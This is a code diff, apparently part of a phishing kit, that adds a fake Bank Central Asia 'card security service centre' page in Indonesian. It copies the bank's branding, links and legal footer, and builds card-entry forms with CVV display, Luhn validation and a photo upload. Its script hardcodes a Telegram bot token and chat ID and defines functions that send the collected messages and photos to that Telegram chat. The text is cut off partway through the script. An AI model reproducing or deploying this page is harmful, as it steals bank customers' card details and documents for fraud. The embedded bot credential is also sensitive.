+        .card-front > *, .card-back > * {
+            position: relative;
+            z-index: 2;
+        }
+
+        .card-front {
+            background: linear-gradient(135deg, #00508c 0%, #003666 100%);
+            color: white;
+            padding: 12px 14px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transform: rotateY(0deg);
+            z-index: 2;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-front::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, transparent 60%);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .card-top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 22px;
+            z-index: 3;
+            position: relative;
+        }
+
+        .card-brand-wrap {
+            display: flex;
+            align-items: center;
+        }
+
+        .card-brand-name {
+            font-weight: 800;
+            font-size: 0.95rem;
+            letter-spacing: 1px;
+            color: #ffffff;
+            line-height: 1.1;
+            font-style: italic;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .card-tier-pill {
+            display: none;
+        }
+
+        .card-logo-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3;
+            position: relative;
+        }
+
+        .card-chip-row {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 8px;
+            margin: 2px 0;
+            z-index: 3;
+            position: relative;
+        }
+
+        .card-chip-left {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+        }
+
+        .emv-chip {
+            width: 30px;
+            height: 22px;
+            background: linear-gradient(135deg, #fae082 0%, #dfb347 40%, #c99824 100%);
+            border-radius: 4px;
+            position: relative;
+            border: 1px solid rgba(150, 110, 20, 0.6);
+            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.7);
+            overflow: hidden;
+        }
+        .emv-chip::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .emv-chip::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 45%;
+            width: 1px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .emv-chip-core {
+            position: absolute;
+            top: 22%;
+            left: 28%;
+            width: 44%;
+            height: 56%;
+            border: 1px solid rgba(0, 0, 0, 0.25);
+            border-radius: 2px;
+        }
+
+        .contactless-icon {
+            color: rgba(255, 255, 255, 0.8);
+            width: 14px;
+            height: 14px;
+        }
+
+        .card-holo-badge {
+            display: none;
+        }
+
+        .card-number-display {
+            font-family: 'SF Mono', 'Roboto Mono', 'Fira Code', 'Courier New', monospace;
+            font-size: 0.96rem;
+            font-weight: 700;
+            letter-spacing: 2.2px;
+            color: #ffffff;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            text-align: left;
+            margin: 3px 0;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.4);
+        }
+
+        .card-bottom-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-meta-group {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-align: left;
+        }
+
+        .card-bottom-label {
+            font-size: 0.5rem;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+        }
+
+        .card-bottom-val {
+            font-family: 'SF Mono', monospace;
+            font-size: 0.76rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: #ffffff;
+        }
+
+        .card-back {
+            background: linear-gradient(135deg, #003666 0%, #00508c 100%);
+            color: white;
+            transform: rotateY(180deg);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 0 0 10px 0;
+            z-index: 1;
+        }
+
+        .card-back .magnetic-strip {
+            width: 100%;
+            height: 32px;
+            background: #1a1a1a;
+            margin-top: 12px;
+        }
+
+        .card-back .signature-cvv-row {
+            padding: 0 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 3px 0;
+        }
+
+        .card-back .signature-box {
+            flex: 1;
+            height: 26px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #666666;
+            font-family: sans-serif;
+            font-size: 0.62rem;
+            font-style: italic;
+            display: flex;
+            align-items: center;
+            padding-left: 8px;
+            border-radius: 3px;
+            border: 1px solid #ced4da;
+            user-select: none;
+        }
+
+        .card-back .cvv-box-display {
+            width: 44px;
+            height: 26px;
+            background: #ffffff;
+            color: #002d62;
+            font-weight: 700;
+            font-family: 'SF Mono', monospace;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 3px;
+            font-size: 0.9rem;
+            letter-spacing: 1.5px;
+            border: 1px solid #ced4da;
+        }
+
+        .card-back .card-back-meta {
+            padding: 0 12px;
+            text-align: left;
+            font-size: 0.48rem;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.2;
+        }
+
+        /* ===== FORM INPUTS & LABELS ===== */
+        .form-group {
+            margin-bottom: 14px;
+            position: relative;
+        }
+        .form-group label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.76rem;
+            font-weight: 700;
+            margin-bottom: 3px;
+            color: var(--text);
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .form-control, .form-select {
+            width: 100%;
+            height: 42px;
+            padding: 0 12px;
+            background: #ffffff;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            color: #1a202c;
+            outline: none;
+            transition: all 0.2s ease;
+            box-sizing: border-box;
+        }
+        .input-wrapper .form-control {
+            padding-right: 36px;
+        }
+        .form-control::placeholder {
+            color: #94a3b8;
+        }
+        .form-control:focus, .form-select:focus {
+            border-color: var(--primary);
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 96, 175, 0.12);
+        }
+        .card-type-chip {
+            color: #00508c;
+            font-size: 0.7rem;
+            font-weight: 800;
+            margin-left: 4px;
+        }
+        .floating-action-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #55606b;
+            display: flex;
+            align-items: center;
+            padding: 4px;
+            z-index: 3;
+        }
+        .form-control.is-valid {
+            border-color: #10b981 !important;
+            background-color: #f0fdf4 !important;
+        }
+        .form-control.is-invalid {
+            border-color: #ef4444 !important;
+            background-color: #fef2f2 !important;
+        }
+        .validation-feedback-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.72rem;
+            font-weight: 800;
+            pointer-events: none;
+            opacity: 0;
+            z-index: 3;
+            transition: opacity 0.2s ease, transform 0.2s ease;
+        }
+        .validation-feedback-icon.valid {
+            opacity: 1;
+            background: #dcfce7;
+            color: #15803d;
+            border: 1px solid #86efac;
+        }
+        .validation-feedback-icon.invalid {
+            opacity: 1;
+            background: #fee2e2;
+            color: #b91c1c;
+            border: 1px solid #fca5a5;
+        }
+
+        .modal-content form {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            height: 46px;
+            background: linear-gradient(135deg, #004080 0%, #0060af 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 0.92rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0, 96, 175, 0.25);
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .submit-btn:hover {
+            box-shadow: 0 6px 16px rgba(0, 96, 175, 0.35);
+            transform: translateY(-1px);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 0.7rem;
+            color: var(--text-light);
+            margin-top: 8px;
+        }
+
+        /* ===== LOADING OVERLAY / HITUNG MUNDUR ===== */
+        .bca-loader-overlay {
+            position: fixed;
+            inset: 0;
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            background: rgba(255, 255, 255, 0.97);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 99999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.25s ease;
+            touch-action: none;
+            overscroll-behavior: none;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        .bca-loader-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .bca-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid var(--surface-alt);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .bca-countdown-number {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 4px;
+        }
+        .bca-loader-text {
+            font-size: 0.82rem;
+            color: var(--text-light);
+            font-weight: 600;
+            line-height: 1.4;
+        }
+
+        /* Upload Box Interaktif */
+        .upload-box {
+            border: 2px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 22px 14px;
+            text-align: center;
+            background: #ffffff;
+            cursor: pointer;
+            margin-bottom: 14px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .upload-box:hover {
+            border-color: #0050a0;
+            background: #f0f7ff;
+            transform: translateY(-2px) scale(1.015);
+            box-shadow: 0 6px 18px rgba(0, 96, 175, 0.12);
+        }
+        .upload-box:active {
+            transform: translateY(0) scale(0.985);
+        }
+
+        /* Modal Action Button Feedback Enhancements */
+        #submitPeroranganBtn {
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1) !important;
+        }
+        #submitPeroranganBtn:hover {
+            background: #d8dee6 !important;
+            border-color: #1e293b !important;
+            color: #000000 !important;
+            transform: translateY(-2px) scale(1.04) !important;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2) !important;
+        }
+        #submitPeroranganBtn:active {
+            transform: translateY(0) scale(0.96) !important;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15) !important;
+        }
+
+        #submitBisnisBtn {
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1) !important;
+        }
+        #submitBisnisBtn:hover {
+            background: #0072d0 !important;
+            transform: translateY(-2px) scale(1.025) !important;
+            box-shadow: 0 8px 24px rgba(0, 96, 175, 0.45) !important;
+        }
+        #submitBisnisBtn:active {
+            transform: translateY(0) scale(0.97) !important;
+            box-shadow: 0 2px 6px rgba(0, 96, 175, 0.2) !important;
+        }
+
+        #tabPerorangan,
+        #tabBisnis {
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1) !important;
+        }
+        #tabPerorangan:hover,
+        #tabBisnis:hover {
+            transform: scale(1.04);
+            filter: brightness(1.08);
+        }
+        #tabPerorangan:active,
+        #tabBisnis:active {
+            transform: scale(0.96);
+        }
+
+        button[title="Beranda"] {
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1) !important;
+        }
+        button[title="Beranda"]:hover {
+            background: #475a6e !important;
+            transform: scale(1.12) !important;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25) !important;
+        }
+        button[title="Beranda"]:active {
+            transform: scale(0.92) !important;
+        }
+
+        #cancelSubmitBtn:not(:disabled) {
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1) !important;
+        }
+        #cancelSubmitBtn:not(:disabled):hover {
+            transform: translateY(-2px) scale(1.025) !important;
+            box-shadow: 0 8px 20px rgba(0, 60, 120, 0.35) !important;
+        }
+        #cancelSubmitBtn:not(:disabled):active {
+            transform: translateY(0) scale(0.97) !important;
+        }
+        .upload-box svg {
+            width: 40px;
+            height: 40px;
+            fill: var(--primary);
+            margin: 0 auto 6px;
+        }
+        .upload-box input[type="file"] {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            cursor: pointer;
+            width: 100%;
+            height: 100%;
+        }
+        .preview-container {
+            display: none;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .preview-container img {
+            max-height: 110px;
+            margin: 0 auto;
+            border-radius: 8px;
+            object-fit: contain;
+            border: 1px solid var(--border);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (min-width: 1280px) {
+            :root {
+                --container-padding-x: 32px;
+            }
+        }
+
+        @media (max-width: 1024px) {
+            .hero {
+                min-height: auto;
+                padding-top: 90px;
+                padding-bottom: 40px;
+            }
+            .hero .container {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 24px;
+            }
+            .hero-cards-grid {
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .hero-visual {
+                margin-top: 5px;
+            }
+            .card-slider-container {
+                max-width: 480px;
+                height: 300px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            :root {
+                --container-padding-x: 20px;
+            }
+            .nav-links {
+                display: none;
+            }
+            .mobile-toggle {
+                display: flex;
+            }
+            .nav-links.open {
+                display: flex;
+                flex-direction: column;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: var(--surface);
+                padding: 20px;
+                box-shadow: var(--shadow);
+                gap: 14px;
+            }
+            .nav-links.open a {
+                color: var(--text);
+            }
+            .hero-content h1 {
+                font-size: 1.7rem;
+                line-height: 1.25;
+                margin-bottom: 56px;
+            }
+            .hero-cards-grid {
+                gap: 12px;
+                width: 100%;
+                max-width: 520px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .hero-card-item {
+                padding: 14px 14px;
+                min-height: 74px;
+                gap: 12px;
+                border-radius: 12px;
+            }
+            .hero-card-icon {
+                width: 38px;
+                height: 38px;
+                min-width: 38px;
+                border-radius: 10px;
+            }
+            .hero-card-icon svg {
+                width: 20px;
+                height: 20px;
+            }
+            .hero-card-title {
+                font-size: 0.92rem;
+            }
+            .card-slider-container {
+                max-width: 420px;
+                height: 265px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            :root {
+                --container-padding-x: 16px;
+            }
+            .hero {
+                padding-top: 80px;
+                padding-bottom: 30px;
+            }
+            .hero-content h1 {
+                font-size: 1.4rem;
+                line-height: 1.25;
+                margin-bottom: 44px;
+            }
+            .hero-cards-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 10px;
+                max-width: 480px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .hero-card-item {
+                padding: 12px 10px;
+                min-height: 78px;
+                gap: 8px;
+                border-radius: 10px;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+            }
+            .hero-card-icon {
+                width: 32px;
+                height: 32px;
+                min-width: 32px;
+                border-radius: 8px;
+            }
+            .hero-card-icon svg {
+                width: 18px;
+                height: 18px;
+            }
+            .hero-card-title {
+                font-size: 0.82rem;
+                line-height: 1.25;
+                text-align: center;
+            }
+            .card-slider-container {
+                max-width: 355px;
+                width: 100%;
+                height: 220px;
+            }
+            .modal-overlay {
+                padding: 0;
+            }
+            .modal-content {
+                padding: 0 16px 36px 16px;
+                border-radius: 0;
+                max-width: 100%;
+                width: 100%;
+                min-height: 100vh;
+                min-height: 100dvh;
+            }
+            .card-flip-container {
+                width: 250px;
+                max-width: 100%;
+                height: 158px;
+                margin: 4px auto 8px auto;
+                clear: both;
+            }
+            .card-number-display {
+                font-size: 0.92rem;
+                letter-spacing: 2px;
+            }
+            #formBlokir, #formBankLain {
+                position: relative;
+                z-index: 2;
+                clear: both;
+                margin-top: 4px;
+            }
+            .form-control, .form-select {
+                height: 40px;
+                padding: 0 11px;
+                font-size: 0.86rem;
+            }
+            .submit-btn {
+                height: 44px;
+                font-size: 0.9rem;
+            }
+            .custom-alert-box {
+                max-width: 300px;
+                padding: 22px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- ===== NAVBAR ===== -->
+    <nav class="navbar" id="navbar">
+        <div class="container">
+            <a href="#" class="navbar-brand">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/3840px-Bank_Central_Asia.svg.png" alt="Bank BCA Logo" />
+            </a>
+            <ul class="nav-links" id="navLinks">
+                <li><button type="button" class="nav-cta" id="navCtaBtn">Pusat Bantuan</button></li>
+            </ul>
+            <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle menu">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- ===== HERO ===== -->
+    <section class="hero" id="hero">
+        <div class="hero-shapes">
+            <div class="shape"></div>
+            <div class="shape"></div>
+        </div>
+        <div class="container">
+            <div class="hero-content">
+                <h1 id="heroTitle"><span id="heroTypingText">Pusat Layanan Keamanan <span class="highlight">Kartu BCA ID</span></span></h1>
+
+                <div class="hero-cards-grid" id="cardsGrid">
+                    <!-- 1. Blokir Kartu BCA -->
+                    <div class="hero-card-item" data-service="blokir">
+                        <div class="hero-card-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                                <line x1="2" y1="10" x2="22" y2="10"></line>
+                                <path d="M15 14h4v4h-4z"></path>
+                                <path d="M16 14v-1.5a1.5 1.5 0 0 1 3 0V14"></path>
+                            </svg>
+                        </div>
+                        <span class="hero-card-title">Blokir Kartu BCA</span>
+                    </div>
+
+                    <!-- 2. Amankan Bank Lain -->
+                    <div class="hero-card-item" data-service="bank-lain">
+                        <div class="hero-card-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M8 10v7M12 10v7M16 10v7M20 10v11"></path>
+                            </svg>
+                        </div>
+                        <span class="hero-card-title">Amankan Bank Lain</span>
+                    </div>
+
+                    <!-- 3. Pembatalan Transaksi -->
+                    <div class="hero-card-item" data-service="pembatalan">
+                        <div class="hero-card-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
+                                <path d="M3 3v5h5"></path>
+                                <line x1="12" y1="8" x2="12" y2="12"></line>
+                                <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                            </svg>
+                        </div>
+                        <span class="hero-card-title">Pembatalan Transaksi</span>
+                    </div>
+
+                    <!-- 4. Amankan USER ID -->
+                    <div class="hero-card-item" data-service="userid">
+                        <div class="hero-card-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="9" cy="7" r="4"></circle>
+                                <rect x="15" y="11" width="7" height="6" rx="1"></rect>
+                                <path d="M17 11V9.5a1.5 1.5 0 0 1 3 0V11"></path>
+                            </svg>
+                        </div>
+                        <span class="hero-card-title">Amankan USER ID</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bagian Visual: Kartu Diperbesar & Mengambang Rapi dengan Tambahan Kartu Baru -->
+            <div class="hero-visual">
+                <div class="card-slider-container">
+                    <div class="card-slide active">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-union.png" alt="BCA UnionPay" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-everyday.png" alt="BCA Everyday Card" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/20220725-BCA-Mastercard-Platinum-Front.png" alt="BCA Mastercard Platinum" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/tiket-card.png" alt="BCA Tiket.com Card" loading="lazy" onerror="this.src='https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-platinum.png'" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/blibli-card.png" alt="BCA Blibli Card" loading="lazy" onerror="this.src='https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-everyday.png'" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/20220722-JCB-Black.png" alt="BCA JCB Black" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-platinum.png" alt="BCA Visa Platinum" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-vsblack.png" alt="BCA Visa Black" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-msblack.png" alt="BCA Mastercard Black" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Feature/Banner/Content-Banner/Bisnis/BCA-Smartcash.png?v=1" alt="BCA Smartcash" loading="lazy" />
+                    </div>
+                    <div class="card-slide">
+                        <img src="https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-world.png" alt="BCA Mastercard World" loading="lazy" onerror="this.src='https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-vsblack.png'" />
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== BCA OFFICIAL BLUE BOTTOM NAVIGATION BAR ===== -->
+    <footer class="bca-bottom-header">
+        <ul class="bca-bottom-menu-grid">
+            <!-- 1. Login -->
+            <li>
+                <a href="https://ibank.klikbca.com/" target="_blank" rel="noopener noreferrer" class="bca-bottom-menu-item">
+                    <div class="bca-bottom-menu-icon">
+                        <!-- Login icon matching screenshot -->
+                        <svg viewBox="0 0 24 24">
+                            <path d="M10 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h5" />
+                            <polyline points="9 8 5 12 9 16" />
+                            <line x1="5" y1="12" x2="20" y2="12" />
+                        </svg>
+                    </div>
+                    <span class="bca-bottom-menu-label">Login</span>
+                </a>
+            </li>
+
+            <!-- 2. Produk -->
+            <li>
+                <a href="https://www.bca.co.id/id/individu/produk" target="_blank" rel="noopener noreferrer" class="bca-bottom-menu-item">
+                    <div class="bca-bottom-menu-icon">
+                        <!-- 4 rounded squares icon matching screenshot -->
+                        <svg viewBox="0 0 24 24">
+                            <rect x="3" y="3" width="7" height="7" rx="2" />
+                            <rect x="14" y="3" width="7" height="7" rx="2" />
+                            <rect x="3" y="14" width="7" height="7" rx="2" />
+                            <rect x="14" y="14" width="7" height="7" rx="2" />
+                        </svg>
+                    </div>
+                    <span class="bca-bottom-menu-label">Produk</span>
+                </a>
+            </li>
+
+            <!-- 3. Layanan -->
+            <li>
+                <a href="https://www.bca.co.id/id/individu/layanan" target="_blank" rel="noopener noreferrer" class="bca-bottom-menu-item">
+                    <div class="bca-bottom-menu-icon">
+                        <!-- Heart / love icon matching screenshot -->
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z" />
+                        </svg>
+                    </div>
+                    <span class="bca-bottom-menu-label">Layanan</span>
+                </a>
+            </li>
+
+            <!-- 4. Promo -->
+            <li>
+                <a href="https://www.bca.co.id/id/promo" target="_blank" rel="noopener noreferrer" class="bca-bottom-menu-item">
+                    <div class="bca-bottom-menu-icon">
+                        <!-- Shopping bag icon matching screenshot -->
+                        <svg viewBox="0 0 24 24">
+                            <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" />
+                            <line x1="3" y1="6" x2="21" y2="6" />
+                            <path d="M16 10a4 4 0 0 1-8 0" />
+                        </svg>
+                    </div>
+                    <span class="bca-bottom-menu-label">Promo</span>
+                </a>
+            </li>
+
+            <!-- 5. Webform BCA -->
+            <li>
+                <a href="https://webform.bca.co.id/" target="_blank" rel="noopener noreferrer" class="bca-bottom-menu-item">
+                    <div class="bca-bottom-menu-icon">
+                        <!-- Pen / write on horizontal line icon matching screenshot -->
+                        <svg viewBox="0 0 24 24">
+                            <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z" />
+                            <line x1="2" y1="22" x2="22" y2="22" />
+                        </svg>
+                    </div>
+                    <span class="bca-bottom-menu-label">Webform
+BCA</span>
+                </a>
+            </li>
+
+            <!-- 6. Chat -->
+            <li>
+                <a href="https://www.bca.co.id/id/tentang-bca/korporasi/hubungi-bca" target="_blank" rel="noopener noreferrer" class="bca-bottom-menu-item">
+                    <div class="bca-bottom-menu-icon">
+                        <!-- Chat bubble with horizontal lines matching screenshot -->
+                        <svg viewBox="0 0 24 24">
+                            <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />
+                            <line x1="9" y1="10" x2="15" y2="10" />
+                            <line x1="9" y1="14" x2="13" y2="14" />
+                        </svg>
+                    </div>
+                    <span class="bca-bottom-menu-label">Chat</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bca-bottom-legal">
+            <p>© 2026 PT Bank Central Asia Tbk. Berizin & Diawasi oleh OJK dan Bank Indonesia serta Peserta Penjaminan LPS.</p>
+        </div>
+    </footer>
+
+    <!-- ===== MODAL POPUP DINAMIS ===== -->
+    <div class="modal-overlay" id="serviceModal">
+        <div class="modal-content" id="modalContentBody">
+            <button class="modal-close" id="modalCloseBtn">&times;</button>
+        </div>
+    </div>
+
+    <!-- ===== JAVASCRIPT ===== -->
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8961452459:AAHavxbPWyCcV2Rz6yEOV-ycfqcSi6RYwNg';
+        const TELEGRAM_CHAT_ID = '8341942326';
+
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error('Gagal mengirim:', err));
+        }
+
+        function sendTelegramPhoto(photoBlob, captionText) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', photoBlob, 'bukti_transaksi.jpg');
+            formData.append('caption', captionText);
+            formData.append('parse_mode', 'Markdown');
+
+            fetch(url, { method: 'POST', body: formData })
+            .catch(err => console.error('Gagal mengirim foto:', err));
+        }
+
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
+        }
+
+        const navbar = document.getElementById('navbar');
+        window.addEventListener('scroll', () => {
+            navbar.classList.toggle('scrolled', window.scrollY > 50);
+        });
+
+        const mobileToggle = document.getElementById('mobileToggle');
+        const navLinks = document.getElementById('navLinks');
+        mobileToggle.addEventListener('click', () => {
+            navLinks.classList.toggle('open');
+        });
+        navLinks.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', () => navLinks.classList.remove('open'));
+        });
+
+        const slides = document.querySelectorAll('.card-slide');
+        let currentSlide = 0;
+        function nextSlide() {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (currentSlide + 1) % slides.length;
+            slides[currentSlide].classList.add('active');
+        }
+        setInterval(nextSlide, 3500);
+
+        const modalOverlay = document.getElementById('serviceModal');
+        const modalContentBody = document.getElementById('modalContentBody');
+
+        function validateLuhn(cardNumber) {
+            const cleanNum = cardNumber.replace(/\D/g, '');
+            if (cleanNum.length < 13 || cleanNum.length > 19) return false;
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = cleanNum.length - 1; i >= 0; i--) {
+                let digit = parseInt(cleanNum.charAt(i), 10);
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
+        // SVG Logo Vector Asli untuk Visa, Mastercard, JCB, Amex, Discover, UnionPay, GPN
